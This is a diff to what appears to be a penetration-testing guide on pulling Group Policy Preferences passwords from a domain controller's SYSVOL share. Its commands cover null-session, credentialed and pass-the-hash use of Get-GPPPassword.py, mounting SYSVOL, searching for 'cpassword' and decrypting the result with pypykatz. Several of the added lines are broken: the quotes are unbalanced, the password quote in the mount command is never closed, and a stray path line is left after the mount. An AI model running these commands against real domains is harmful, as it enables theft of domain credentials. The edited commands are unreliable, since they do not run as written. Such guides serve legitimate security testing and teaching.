@@ -24,13 +24,13 @@ From UNIX-like systems, the [Get-GPPPassword.py](https://github.com/SecureAuthCo
 
 ```bash
 # with a NULL session
-Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'
+Get-GPPPassword.py -no-pass "$DC_HOST"
 
 # with cleartext credentials
-Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
+Get-GPPPassword.py "$DOMAIN/$USER:$PASSWORD@$DC_HOST"
 
 # pass-the-hash
-Get-GPPPassword.py -hashes 'LMhash':'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
+Get-GPPPassword.py -hashes ":$NT_HASH" "$DOMAIN"/"$USER@"$DC_HOST"
 ```
 
 Alternatively, searching for passwords can be done manually (or with Metasploit's `smb_enum_gpp` module), however it requires mounting the `SYSVOL` share, which can't be done through a docker environment unless it's run with privileged rights.
@@ -42,16 +42,11 @@ Tools like [pypykatz](https://github.com/skelsec/pypykatz) (Python) and [gpp-dec
 sudo mkdir /tmp/sysvol
 
 # mount the SYSVOL share
-sudo mount\
- -o domain='domain.local'\
- -o username='someuser'\
- -o password='password'\
- -t cifs\
- '//domain_controller/SYSVOL'\
+sudo mount -o domain="$DOMAIN" -o username="$USER" -o password="$PASSWORD -t cifs "//$DC_HOST/SYSVOL"
  /tmp/sysvol
 
 # recursively look for "cpassword" in Group Policies
-sudo grep -ria cpassword /tmp/sysvol/'domain.local'/Policies/ 2>/dev/null
+sudo grep -ria cpassword "/tmp/sysvol/$DOMAIN/Policies/" 2>/dev/null
 
 # decrypt the string and recover the password
 pypykatz gppass j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
